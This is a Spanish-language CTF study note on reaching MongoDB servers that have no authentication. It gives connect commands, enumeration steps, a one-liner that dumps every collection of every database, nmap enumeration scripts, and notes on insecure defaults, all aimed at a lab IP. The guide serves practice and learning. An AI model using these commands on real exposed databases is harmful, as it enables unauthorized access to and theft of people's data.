---
tags: [database, mongodb]
---

> **MongoDB** es una base de datos NoSQL de documentos que corre en **puerto 27017**. Por defecto no tiene autenticación, lo que la convierte en un objetivo de alto valor para exfiltración de datos en CTFs. Esta guía cubre lo que hemos practicado.

---

## Quickstart — Acceso sin autenticación

```bash
# Conectarse a MongoDB sin credenciales (mongosh — shell moderno)
$ mongosh mongodb://10.129.1.10:27017
test> show dbs

# Shell legacy mongo (común en versiones antiguas)
$ mongo 10.129.1.10:27017
> show dbs
```

---

## Enumeración básica

```bash
$ mongo 10.129.1.10:27017

# Listar bases de datos
> show dbs
> db.adminCommand({listDatabases: 1})

# Cambiar de base de datos
> use admin
> use sensitive_information

# Mostrar la base de datos actual
> db
> db.getName()

# Listar colecciones
> show collections
> db.getCollectionNames()

# Ver la versión del servidor
> db.version()
```

### Dumpear datos

```bash
# Dentro del shell interactivo
> use sensitive_information
> db.getCollectionNames()
> db.flag.find().pretty()
> db.users.find().pretty()

# Con --eval (una línea, sin interactuar)
$ mongo 10.129.1.10:27017/sensitive_information --eval 'db.flag.find().forEach(printjson)'

# Dumpear TODAS las colecciones de TODAS las bases de datos
$ mongo --quiet 10.129.1.10:27017 --eval '
  db.adminCommand({listDatabases: 1}).databases.forEach(function(d) {
    print("=== " + d.name + " ===");
    var dbObj = db.getSiblingDB(d.name);
    dbObj.getCollectionNames().forEach(function(c) {
      print("  --- " + c + " ---");
      dbObj.getCollection(c).find().forEach(printjson)
    })
  })
'
```

---

## MongoDB Commands Cheat Sheet

### Database Operations

| Comando | Qué hace |
| :------ | :------ |
| `show dbs` | Listar todas las bases de datos |
| `use <db>` | Cambiar a / crear una base de datos |
| `db` | Mostrar nombre de la base de datos actual |
| `db.getName()` | Igual que `db` |

### Collection Operations

| Comando | Qué hace |
| :------ | :------ |
| `show collections` | Listar colecciones en la DB actual |
| `db.getCollectionNames()` | Igual que arriba, devuelve array |

### Lectura de datos

| Comando | Qué hace |
| :------ | :------ |
| `db.<col>.find().pretty()` | Dumpear todos los documentos (pretty-printed) |
| `db.<col>.findOne()` | Devolver el primer documento |
| `db.<col>.find({key: "value"})` | Filtrar por campo |
| `db.<col>.countDocuments()` | Contar documentos |

---

## Useful Nmap Scripts

```bash
# Detectar MongoDB + enumerar bases de datos (el script más útil)
nmap --script mongodb-databases -p27017 10.129.1.10

# Listar info de MongoDB
nmap --script mongodb-info -p27017 10.129.1.10
```

---

## MongoDB Security Notes

- **Sin auth por defecto** — MongoDB ≤ 3.6 viene con `authorization: disabled` en `/etc/mongod.conf`
- `bindIp` por defecto es `127.0.0.1` en versiones nuevas, pero muchos admins lo cambian a `0.0.0.0` y olvidan habilitar auth
- Lo vimos en: **Mongod** (MongoDB 3.6.8, sin auth, flag en `sensitive_information.flag`)

---

## 🔗 Related

**Machines:** [[👹 Mongod]]

**Guides:** [[🗄️ Redis]]

---

## References

- [MongoDB Official Documentation](https://www.mongodb.com/docs/manual/)
- [HackTricks — Pentesting MongoDB (27017)](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)
- [Nmap NSE — mongodb-databases](https://nmap.org/nsedoc/scripts/mongodb-databases.html)
